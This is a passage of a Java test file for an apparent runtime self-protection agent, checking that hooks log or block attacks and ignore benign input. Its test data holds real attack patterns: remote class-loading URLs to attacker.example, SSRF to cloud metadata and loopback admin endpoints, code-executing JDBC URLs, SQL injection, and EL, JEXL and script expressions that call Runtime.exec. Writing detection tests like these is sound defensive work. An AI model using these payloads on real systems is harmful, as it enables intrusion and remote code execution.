    Java8RaspHooks.beforeFileUpload("avatar.png");

    assertFalse(Files.exists(log));
  }

  @Test
  void logsJavaArchiveUploadOnPluginEndpoint() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-plugin-upload", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeHttpRequest(new RequestStub("POST", "/plugin/add", ""));
    try {
      Java8RaspHooks.beforeFileUpload("Evil.jar");
    } finally {
      Java8RaspHooks.afterHttpRequest();
    }

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"fileUpload_java_archive\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("\"filename\":\"Evil.jar\""));
  }

  @Test
  void ignoresJavaArchiveUploadOnRepositoryEndpoint() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-repository-upload", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeHttpRequest(new RequestStub("POST", "/service/rest/v1/components", ""));
    try {
      Java8RaspHooks.beforeFileUpload("library.jar");
    } finally {
      Java8RaspHooks.afterHttpRequest();
    }

    assertFalse(Files.exists(log));
  }

  @Test
  void blocksJavaArchiveUploadOnPluginEndpointWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-plugin-upload-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    Java8RaspHooks.beforeHttpRequest(new RequestStub("POST", "/plugin/add", ""));
    try {
      assertThrows(
          Java8RaspBlockException.class,
          () -> Java8RaspHooks.beforeFileUpload("Evil.jar"));
    } finally {
      Java8RaspHooks.afterHttpRequest();
    }

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"fileUpload_java_archive\""));
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void blocksMultipartScriptUploadWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-script-upload-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    assertThrows(
        Java8RaspBlockException.class,
        () -> Java8RaspHooks.beforeFileUpload("ohmyrasp-wl2894-block.jsp"));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"fileUpload_multipart_script\""));
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void blocksWebrootScriptFileWriteWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-file-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    assertThrows(
        Java8RaspBlockException.class,
        () -> Java8RaspHooks.beforeRandomAccessFileOpen("/tmp/webapps/ROOT/shell.jsp", "rw"));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_file_script_write\""));
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void ignoresNormalUrlOpen() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-url-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeUrlOpen(new URL("https://example.com/public/api"));

    assertFalse(Files.exists(log));
  }

  @Test
  void rewritesFastjson1283ClassResourceLookup() throws Exception {
    byte[] transformed =
        new Java8FastjsonTransformer()
            .transform(
                null,
                "com/alibaba/fastjson/parser/ParserConfig",
                null,
                null,
                classBytes(com.alibaba.fastjson.parser.ParserConfig.class));

    assertTrue(transformed != null && transformed.length > 0);
    assertTrue(
        new String(transformed, StandardCharsets.ISO_8859_1)
            .contains("beforeFastjsonClassResource"));
  }

  @Test
  void logsFastjson1283ResourceUrlGadgetVariants() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-fastjson-resource", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeFastjsonClassResource("http://192.168.65.254:19090/a.class");
    Java8RaspHooks.beforeFastjsonClassResource(
        "jar:http://192.168.65.254:19090/probe!/foo/Exception.class");
    Java8RaspHooks.beforeFastjsonClassResource(
        "jar:file:/proc/self/fd/3!/fd3/Exception.class");

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_deserialization_fastjson_resource_url\""));
    assertTrue(text.contains("http://192.168.65.254:19090/a.class"));
    assertTrue(text.contains("jar:http://192.168.65.254:19090/probe!/foo/Exception.class"));
    assertTrue(text.contains("jar:file:/proc/self/fd/3!/fd3/Exception.class"));
  }

  @Test
  void ignoresNormalFastjsonClassResources() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-fastjson-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeFastjsonClassResource("com/example/orders/Order.class");
    Java8RaspHooks.beforeFastjsonClassResource("jar:file:/opt/app/lib/models.jar!/Order.class");
    Java8RaspHooks.beforeFastjsonClassResource(null);

    assertFalse(Files.exists(log));
  }

  @Test
  void blocksFastjson1283BeforeRemoteClassResourceLookup() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-fastjson-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    assertThrows(
        Java8RaspBlockException.class,
        () ->
            Java8RaspHooks.beforeFastjsonClassResource(
                "jar:http://192.168.65.254:19090/probe!/foo/Exception.class"));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_deserialization_fastjson_resource_url\""));
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void logsCloudMetadataUrlOpen() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-url-metadata", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeUrlOpen(new URL("http://169.254.169.254/latest/meta-data/"));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_ssrf_cloud_metadata\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("\"url\":\"http://169.254.169.254/latest/meta-data/\""));
  }

  @Test
  void blocksLoopbackAdminUrlWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-url-local-admin", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    assertThrows(
        Java8RaspBlockException.class,
        () -> Java8RaspHooks.beforeUrlOpen(new URL("http://127.0.0.1:8080/actuator/env")));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_ssrf_loopback_admin\""));
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void ignoresDataEaseApisixStartupProbe() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-dataease-apisix-startup", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    io.dataease.xpack.permissions.apisix.manage.XpackRouteManage.checkApisixUpstreams();

    assertFalse(Files.exists(log));
  }

  @Test
  void blocksDataEaseApisixAdminUrlOutsideStartupStack() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-dataease-apisix-direct", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    assertThrows(
        Java8RaspBlockException.class,
        () ->
            Java8RaspHooks.beforeUrlOpen(
                new URL("http://127.0.0.1:9180/apisix/admin/upstreams")));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_ssrf_loopback_admin\""));
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void blocksRequestParameterControlledUrlOpenWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-url-request-param", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    RequestStub request =
        new RequestStub("POST", "/geoserver/TestWfsPost", "")
            .withParameter("url", "http://attacker.example:18080/relay?x=1");
    Java8RaspHooks.beforeHttpRequest(request);
    try {
      assertThrows(
          Java8RaspBlockException.class,
          () -> Java8RaspHooks.beforeUrlOpen(new URL("http://attacker.example:18080/relay?x=1")));
    } finally {
      Java8RaspHooks.afterHttpRequest();
    }

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_ssrf_request_parameter_url\""));
    assertTrue(text.contains("\"action\":\"block\""));
    assertTrue(text.contains("http://attacker.example:18080/relay?x=1"));
  }

  @Test
  void clearsRequestParameterControlledUrlsAfterHttpRequest() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-url-request-param-clear", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    RequestStub request =
        new RequestStub("POST", "/geoserver/TestWfsPost", "")
            .withParameter("url", "http://attacker.example:18080/relay");
    Java8RaspHooks.beforeHttpRequest(request);
    Java8RaspHooks.afterHttpRequest();
    Java8RaspHooks.beforeUrlOpen(new URL("http://attacker.example:18080/relay"));

    assertFalse(Files.exists(log));
  }

  @Test
  void ignoresSafeArchiveEntryFileWrite() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-archive-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.afterArchiveEntryName("safe/report.txt");
    Java8RaspHooks.beforeFileWrite("/tmp/archive/report.txt");

    assertFalse(Files.exists(log));
  }

  @Test
  void logsArchiveTraversalFileWrite() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-archive-traversal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.afterArchiveEntryName("../../webapps/ROOT/shell.jsp");
    Java8RaspHooks.beforeFileWrite("/tmp/extract/shell.jsp");

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_archive_entry_traversal_write\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("../../webapps/ROOT/shell.jsp -> /tmp/extract/shell.jsp"));
  }

  @Test
  void ignoresSafeGeneratedPlotScriptWrite() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-plot-script-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    byte[] content = "set yrange [0:42]\nplot '-' using 1:2".getBytes(StandardCharsets.UTF_8);
    Java8RaspHooks.beforeFileWrite("/tmp/opentsdb/safe.gnuplot");
    Java8RaspHooks.beforeFileContentWrite(content, 0, content.length);

    assertFalse(Files.exists(log));
  }

  @Test
  void logsGeneratedPlotScriptCommandWrite() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-plot-script-command", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    byte[] content =
        "set yrange [0:system('touch /tmp/ohmyrasp-opentsdb-success')]\nplot '-' using 1:2"
            .getBytes(StandardCharsets.UTF_8);
    Java8RaspHooks.beforeFileWrite("/tmp/opentsdb/evil.gnuplot");
    Java8RaspHooks.beforeFileContentWrite(content, 0, content.length);

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_file_generated_plot_script_command\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("\"path\":\"/tmp/opentsdb/evil.gnuplot\""));
  }

  @Test
  void blocksGeneratedPlotScriptCommandWriteWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-plot-script-command-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    byte[] content =
        "set key ;system \"touch /tmp/ohmyrasp-opentsdb-success\" \"\"\nplot '-' using 1:2"
            .getBytes(StandardCharsets.UTF_8);
    Java8RaspHooks.beforeFileWrite("/tmp/opentsdb/evil.gnuplot");

    assertThrows(
        Java8RaspBlockException.class,
        () -> Java8RaspHooks.beforeFileContentWrite(content, 0, content.length));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_file_generated_plot_script_command\""));
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void rewritesSevenZipArchiveEntryPathGetter() throws Exception {
    byte[] transformed =
        new Java8ArchiveTransformer()
            .transform(
                null,
                "net/sf/sevenzipjbinding/simple/impl/SimpleInArchiveItemImpl",
                null,
                null,
                classBytes(net.sf.sevenzipjbinding.simple.impl.SimpleInArchiveItemImpl.class));

    assertTrue(transformed != null && transformed.length > 0);
  }

  @Test
  void blocksArchiveTraversalFileWriteWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-archive-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    Java8RaspHooks.afterArchiveEntryName("/WEB-INF/web.xml");

    assertThrows(
        Java8RaspBlockException.class,
        () -> Java8RaspHooks.beforeFileWrite("/tmp/extract/WEB-INF/web.xml"));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_archive_entry_traversal_write\""));
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void ignoresNormalJdbcUrl() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-jdbc-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeJdbcConnection("jdbc:h2:mem:application");
    Java8RaspHooks.beforeJdbcConnection("jdbc:mysql://localhost/app?useSSL=false");

    assertFalse(Files.exists(log));
  }

  @Test
  void logsH2JdbcCodeExecutionUrl() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-jdbc-h2", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeJdbcConnection(
        "jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://127.0.0.1/poc.sql'");

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_jdbc_h2_code_execution\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("\"jdbc_url\":\"jdbc:h2:mem:test;INIT=RUNSCRIPT"));
  }

  @Test
  void logsDirectH2JdbcConnectionConstructorUrl() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-jdbc-h2-direct", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeH2JdbcConnection(
        "jdbc:h2:mem:test;INIT=CREATE ALIAS EXEC AS $$ void exec() { Runtime.getRuntime().exec(\"id\"); } $$");

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"hook\":\"org.h2.jdbc.JdbcConnection.<init>\""));
    assertTrue(text.contains("\"algorithm\":\"java8_jdbc_h2_code_execution\""));
    assertTrue(text.contains("\"action\":\"log\""));
  }

  @Test
  void logsDerbyJdbcCodeLoadingUrl() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-jdbc-derby", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeJdbcConnection(
        "jdbc:derby:memory:test;create=true;derby.database.classpath=APP.malicious");

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_jdbc_derby_code_loading\""));
    assertTrue(text.contains("\"action\":\"log\""));
  }

  @Test
  void blocksMysqlJdbcDeserializationUrlWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-jdbc-mysql-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    assertThrows(
        Java8RaspBlockException.class,
        () ->
            Java8RaspHooks.beforeJdbcConnection(
                "jdbc:mysql://127.0.0.1/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor"));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_jdbc_mysql_deserialization\""));
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void logsSqlIdentifierInjection() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-sql-identifier", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeSqlIdentifier("sqli/**/where/**/1=1--");

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"hook\":\"SQL.identifier\""));
    assertTrue(text.contains("\"algorithm\":\"java8_sql_identifier_injection\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("reason=sql-comment"));
    assertTrue(text.contains("parameter=metricName"));
    assertFalse(text.contains("sqli/**/where"));
  }

  @Test
  void ignoresNormalSqlIdentifierMetricName() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-sql-identifier-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeSqlIdentifier("service_instance_jvm_memory.max");

    assertFalse(Files.exists(log));
  }

  @Test
  void blocksSqlIdentifierInjectionWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-sql-identifier-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    assertThrows(
        Java8RaspBlockException.class,
        () -> Java8RaspHooks.beforeSqlIdentifier("sqli;drop/**/table/**/x"));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_sql_identifier_injection\""));
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void blocksMyBatisOrderTypeSqlIdentifierInjectionWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-mybatis-order-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    Map<String, Object> parameterObject =
        myBatisParameterMap(
            new MyBatisQueryRequest(
                Arrays.asList(new MyBatisOrder("name", ",if(1=1,sleep(2),0)", null))));

    assertThrows(
        Java8RaspBlockException.class,
        () ->
            Java8RaspHooks.beforeMyBatisBoundSql(
                "select * from test_case order by `name` ,if(1=1,sleep(2),0)",
                parameterObject));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"hook\":\"MyBatis.BoundSql\""));
    assertTrue(text.contains("\"algorithm\":\"java8_sql_identifier_injection\""));
    assertTrue(text.contains("\"action\":\"block\""));
    assertTrue(text.contains("source=MyBatis.BoundSql"));
    assertTrue(text.contains("parameter=orders[].type"));
    assertFalse(text.contains(",if(1=1"));
    assertFalse(text.contains("sleep(2)"));
  }

  @Test
  void ignoresNormalMyBatisOrderMetadata() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-mybatis-order-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Map<String, Object> parameterObject =
        myBatisParameterMap(
            new MyBatisQueryRequest(
                Arrays.asList(new MyBatisOrder("update_time", "desc", "test_case"))));

    Java8RaspHooks.beforeMyBatisBoundSql(
        "select * from test_case order by test_case.`update_time` desc", parameterObject);

    assertFalse(Files.exists(log));
  }

  @Test
  void ignoresLocalClassLoaderUrls() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-classloader-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeClassLoaderUrls(
        new URL[] {new URL("file:/usr/local/tomcat/webapps/ROOT/WEB-INF/lib/app.jar")});

    assertFalse(Files.exists(log));
  }

  @Test
  void ignoresFelixExtensionClassLoaderCodebase() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-classloader-felix", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeClassLoaderUrl(new URL("http://felix.extensions:9/"));

    assertFalse(Files.exists(log));
  }

  @Test
  void logsRemoteUrlClassLoaderCodebase() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-classloader-remote", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeClassLoaderUrls(
        new URL[] {new URL("jar:http://attacker.example/evil.jar!/payload/")});

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_classloader_remote_codebase\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("URLClassLoader http jar:http://attacker.example/evil.jar!/payload/"));
  }

  @Test
  void blocksRmiClassLoaderCodebaseWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-rmi-classloader-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    assertThrows(
        Java8RaspBlockException.class,
        () -> Java8RaspHooks.beforeRmiClassLoaderCodebase("ldap://attacker.example/Exploit"));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_classloader_remote_codebase\""));
    assertTrue(text.contains("\"action\":\"block\""));
    assertTrue(text.contains("RMIClassLoader ldap ldap://attacker.example/Exploit"));
  }

  @Test
  void ignoresNormalScriptEngineEval() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-script-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeScriptEval("1 + 1");
    Java8RaspHooks.beforeScriptEval("var value = Math.max(1, 2); value");

    assertFalse(Files.exists(log));
  }

  @Test
  void logsScriptEngineRuntimeExecution() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-script-runtime", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeScriptEval("Java.type('java.lang.Runtime').getRuntime().exec('id')");
    Java8RaspHooks.beforeScriptEval(
        "function(){var a = new java.util.Scanner(java.lang.Runtime.getRuntime().exec([\"sh\",\"-c\",\"id\"]).getInputStream()).useDelimiter(\"\\\\A\").next();return {timestamp:123123,test: a}}");

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_script_engine_runtime_execution\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("Java.type('java.lang.Runtime').getRuntime().exec('id')"));
    assertTrue(text.contains("java.util.Scanner"));
  }

  @Test
  void blocksScriptEngineProcessBuilderWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-script-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    assertThrows(
        Java8RaspBlockException.class,
        () -> Java8RaspHooks.beforeScriptEval("new java.lang.ProcessBuilder('id').start()"));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_script_engine_runtime_execution\""));
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void ignoresNormalJexlExpression() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-jexl-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeJexlExpression(new FakeJexlExpression("asset.name == 'example.jar'"));
    Java8RaspHooks.beforeJexlExpression(new FakeJexlExpression("user.name ?: 'guest'"));

    assertFalse(Files.exists(log));
  }

  @Test
  void logsJexlRuntimeExecutionWithoutRawExpression() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-jexl-runtime", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeJexlExpression(
        new FakeJexlExpression(
            "233.class.forName('java.lang.Runtime').getRuntime().exec('touch /tmp/ohmyrasp-nexus7238-success')"));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_jexl_runtime_execution\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("engine=jexl expressionLength="));
    assertFalse(text.contains("ohmyrasp-nexus7238-success"));
  }

  @Test
  void blocksJexlProcessBuilderWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-jexl-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    assertThrows(
        Java8RaspBlockException.class,
        () -> Java8RaspHooks.beforeJexlExpression(
            new FakeJexlExpression("new java.lang.ProcessBuilder('id').start()")));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_jexl_runtime_execution\""));
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void ignoresNormalElExpression() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-el-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeElExpression(new FakeElExpression("${user.name}"));
    Java8RaspHooks.beforeElExpression(new FakeElExpression("${233 * 233}"));

    assertFalse(Files.exists(log));
  }

  @Test
  void logsElRuntimeExecutionWithoutRawExpression() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-el-runtime", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeElExpression(
        new FakeElExpression(
            "${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('touch /tmp/ohmyrasp-nexus10204-success')}"));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_el_runtime_execution\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("engine=el expressionLength="));
    assertFalse(text.contains("ohmyrasp-nexus10204-success"));
  }

  @Test
  void blocksElProcessBuilderWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-el-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    assertThrows(
        Java8RaspBlockException.class,
        () -> Java8RaspHooks.beforeElExpression(
            new FakeElExpression("${new java.lang.ProcessBuilder('id').start()}")));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_el_runtime_execution\""));
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void ignoresNormalJavaCompilation() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-compile-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeJavaCompilationSource(
        "javac", "public class SafeCompile { int value() { return 1 + 1; } }");

    assertFalse(Files.exists(log));
  }

  @Test
  void logsJavaCompilationRuntimeExecution() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-compile-runtime", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeJavaCompilationSource(
        "javac",
        "public class EvilCompile { void run() throws Exception { java.lang.Runtime.getRuntime().exec(\"id\"); } }");

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_java_compile_runtime_execution\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("java.lang.Runtime.getRuntime().exec"));
  }

  @Test
  void blocksJavaCompilationProcessBuilderWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-compile-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    assertThrows(
        Java8RaspBlockException.class,
        () ->
            Java8RaspHooks.beforeJavaCompilationSource(
                "janino",
                "class Demo { void run() throws Exception { new ProcessBuilder(\"id\").start(); } }"));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_java_compile_runtime_execution\""));
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void ignoresNormalJaasConfig() throws Exception {
